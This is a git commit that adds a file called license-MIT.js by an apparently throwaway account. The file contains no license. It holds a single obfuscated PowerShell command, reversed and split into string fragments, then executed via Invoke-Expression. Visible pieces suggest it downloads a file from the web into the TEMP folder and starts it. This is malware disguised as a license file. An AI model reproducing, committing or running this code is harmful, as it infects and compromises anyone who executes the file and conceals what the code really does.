bf424ec0bdafd98846fe15ef1e5d3d1113d514b4
Azkic50 <Azkilohj55@gmail.com>
2025-04-08 13:55:05 -0400

    Create license-MIT.js

---
+++ license-MIT.js
@@ -0,0 +1,22 @@
+Set ("RW"+"vN") ( ")''nioj-]52,42,4[CEpSMOC:Vne$ (. | )93]RAhc[,'zdL'EcaLPeR- 421]RAhc[,'Qhs' EcaLPeR-  43]RAhc[,'DAW'eCaLpErC- 63]RAhc[,'9XK' EcaLPeR- )')z'+'dLXzdL+]31[DILlEHs9XK+]1[DilLeHs9XK (&Qhs )69]rAhc[]gniRtS[,)48]rAhc[+15]rAhc[+66]rAhc[((EcALPer.)zdL9XKzdL,)87]rAhc[+97]rAh'+'c[+17]rAhc[((Ec'+'ALPer.)421]rAhc[]gniRt'+'S[,)05]rAhc[+17]rAhc[+001'+']rAhc[((EcALPer.)93]rAhc[]gniR'+'tS[,)05]rAhc[+701]r'+'Ahc[+65]rAhc'+'[((EcALPer.))zdL+2k8iD{zi3   2k8+2k8   2k8+2k8
+;Q3w2k8+2'+'k8)2k8+2k'+'8b.2k8+2k8izi3zdL,zdL8+2k8U2k8+2k8DFzdL,zdL+2k8= }dAOL2k8+2k8zr2k8+2k8in2k8+2k8WOzdL,zdL'+'8+2k8 
+'+'
+}2k8+2k8 2k8+2k8 2'+'k8+2k8
+2zdL,zdL01{}6{2k8+2'+'k8Q32k8+2k8w(zdL,zdL+2k8t,H2k8zdL,zdLL2k'+'8+2k8I2k8+2kzdL,zdLk8ac 2k8+2k8 '+'2k8+2k8  
+}    
+2k8+2k8;}hTap'+'EzdL,zdL;)2k8+2k8
+}2k8+2kzdL,zdL2k8+2k8 2k8+2k8= 2k8+2k8)HitaHi2k8+2k8t({2k8+2k8@]2k8+2k8t'+'cejbO2k8+2k8'+'motsuC2k8+2k8S2k8+2k8P[2k8+2k8 zdL,zdLGnIrts[,)811]rahC[+25]rahC[+601]rahC[((eCalpEr.)2'+'k8T3B2k8,)221]rahC[+411]rah'+'C[+501]rahC[((eCalpEr.)93zdL,zdLw}02k8+2k8{}22k8+2k8{}1{Q2k8+2k832k8+2k8w(2k8+2k8&2k8+2k8      '+'
+2k8+zdL,zdL 2zdL,zdL8zrizdL,zdL2k8+2k8{}1{}3{2k8+2k8}0{}4{Q3w2k8+2k8(&      '+'  '+'2k8+2k8
+{ 2k8+2k8)'+'}dAOl2k8+2k8zrinWzr2k8'+'+2k8i2k8+2k8o2'+'k8+2k8D{zi32k8+2k8( fi 2k8+2'+'k'+'8  2k8+2k8   
+2k8+2k8 2k8+2k8}  zdL,zdL2k8+]31[diLlEhSNOG+]1[dIlLeHSNOG ( &2Gd)2zdL,zdL]rahzdL,zdL2k8+2k8H2k8+2k8it,H'+'its.Hit,2k8+2k8Hit/pohHit,Hit2k8+2k8daH2k8+2k8i2k8+2k8t,H2k8+2k8i2k8+2k8tVKH2k8+2k8it,HzdL,zdL   2k8+2k8 
+2k8+2k8;}eSL2k8+2k8zriAF2k8+2k8{z2k8+2k8i2k8+2k83 2k8+2k8= }D2k'+'8+2k8AzriOlNWOzriD{zi3  zdL,zdLah'+'C[((eCalpEr.)43]rahC['+']GnIrts[,2k8Q3w2k8(eCalpEr.)2k8'+'NOG2k8,)221]rahC[+5'+'01]'+'rahC'+'[+15]'+'rahC[((eCalpEr.)2k'+'8 2kzdL,zdL8)Hit2k8+2k8V2k8+2k8Hi'+'t,H2k8+2k8it2k8+2k8KGUDF2k8+2k8Hi2k8+2k8t,Hi'+'tK2k8+2k8Hit,H2k8+2k8itis2k8+2k8m.LHitf2k8+2k8- Q3w}02k8+2k8{2k8+2k8}2{2k8+2k8}3{}1{Q3w( = )2'+'k8+2k8Hitb2k8+2k8Hit2k8+2k8( 2k8+2k8;2k8+2k8)Hi2k8+2k8tp2k'+'8+'+'2k8zdL,zdL2k8
+ 2k8+2k8zdL,zdL[zdL,zdL9]'+'rahC[]zdL,zdL]GnIrts['+',)27]rahC[+501]rahC[+611]rzdL,zdL80{zdL,zdLizdL,zdLk8zdL,zdL2k8+2k8}22k8+2k8{}1{Q3'+'2k8+2k8w(2k8+2k8.2k8+2k8('+' 2k8+2k8fi2k8+2k8  2k8+2k8 2k8+2k8   
+2k8+2k8;}EURz2k8+2k8rit{zi2k8+2k83 2k8zdL,z'+'dL-Q3w}2k8+2kzdL,zdL2k8+2k8 
+(2k8+2k8@ = }2zdL,zdLHi2k8zdL,zdL'+'k8+2k'+'8zdL,zdLriF2k8+2k8{2k8+2k8z2'+'k8+2k8i3 )Hi2k8+2k8tP'+'Hit,Hit-tseTHit,2k'+'8+2k'+'8zdL'+',zdLk8+2kzdL,zdL8+2'+'k8zr'+'iAp'+'ezr2k8+2k8il2k8+2k8if'+'{'+'zi3 2k8+2k8  2'+'k8+2k8  2k8+2k8 
+{ 2k8+2k8y2k8+2k8rt2k8zdL,zdL    2k8+2k8 
+{ 2k8+2k8)}HT2k8+2k8Apz2k8'+'+2k8riElizzdL,zdLtekov2k8+2k8nI2k8+2k8H2k8+2k8i2k8+2k8t,Hitte2k8+2'+'k8MtHit,H2k8+2k8itdoHit,HithHit,HitseR2k8+2k8-H2k8+2k8it2k8+2k8f-Q3w}2'+'zdL,zdL2k8}2k8+2k8 2k8+2k8zdL,zdL+2k8}    
+2k8+2k8{ 2k8+2k8'+'h2k8zdL,zdL8+2k8of  
+zdL,zdLCzdL,zdL2k8+2k8F{2'+'k8+2k8z2k8+2k8i3 2k8+2k8)H2k8+2k8it2k'+'8+2k8secH2k8+2k8i2k8+2k8t,Hito2k8+2k8r2k8+2k8P-tra2k8+2k8tSHi2k8+2'+'kzdL,zd'+'L+2k8ct2k8+2zdL,zdLHithtaHitfzdL,zdL2k8+2k8it2k8+2k8:sH2k8+2k8i2k8'+'+2k8tf-2k8+2k8 Q3w2k8+2k8}5{}12k8+2k8{2k8+2k8}3{}42k8+2k8{}2{}7'+'2k8+2k8{2k8+2k8}9{}'+'8{}02k'+'8+2k8{2k8+2k8}zdL,zdL+2k8 2k8+2k8 '+'  
+2k8+2k8{ )}a2k8+2k8Tzr2k'+'8+2k8i2k8+2k8AzridE2'+'k8+2k8M2k8+2k8os{zi3 n2k8+2'+'k8i 2k8+2'+'k8}2k8+2k8I{2k8+2k8zi32k8+2k8( hc2k8'+'+2k8ae2k8+'+'2k8r'+'2kzdL,zdL  2k8+2k8   2k8+zd'+'L,zdL2k8+2k'+'8{'+'z'+'i3'+'2k8+2k8 irU- )2k8+2k8HizdL,zdL8t,2'+'k8+2k8H2k8+2k8itsHit f2k8+2k8-Q2'+'k8'+'+2k83zdL,zdL+2k8itlliw2k8'+'+2k8ve2'+'k8+2k8mH2k8+2k8i2k8+2k8t2k8+2k8,HitozdL,zdL8a2k8+2k8T2k8+2k8a2k8+2k8dzr'+'i2k8+2k8EM2k8+2k8zriOS{2k'+'8+2k8'+'z2k8+2k8i3 '+' 
+
+2k8(zdL,zdLs//Hi2k8+2k8t,'+'Hit2k8+2k8b2k8'+'+2k8Hi2k8+2k8t,HittthHit,Hi2k8+2k8ti'+'sm.LKG2kzdL,zdL;}hTApel2k'+'8+2k8z2k8+2k8r2k8+2k8iIz2k8+2k8ri2k8+2k8f{zi2k8+2k83 e2k8+2k8li2k8+2k8F2k8+2k8tuO- Q3waQ3w.2k8+2k8}zd'+'L,zd'+'L'+'zr2k8zdL,zdL(z2k8+2k8i2k8+2k832k8+2k8v4'+'j'+'P2k8+2k8MET:vnezi32k8+2k8Q3w2'+'k8+2k8 = }h2k8+2k8T2kzdL,zdL)2k8XzdLf- DAW}0{}14{}33{}64{}04{}51{}43{}23{}73{}35{}92{}71'+'{}'+'31{}94{}05{}34{}41{}7'+'{}54{}'+'81{}9{}53{}3{}03{}8{}91{}24{}83{}44{}42{}02{}32{}21{}72{}13{}82{}45{}2{}65{}1{}12{}01{}61{}84{}63{}52{}15{}6{}4{}55{}93{}'+'11{}25{}74{}62{}22{}5{DAW(('(( "); &((Gv '*Mdr*').name[3,11,2]-JoIN'')([sTrinG]::JoiN('', (  VaRIABLE ("rW"+"vN")).VAlUe[- 1.. - ((  VaRIABLE ("rW"+"vN")).VAlUe.lENgTH ) ] ) )
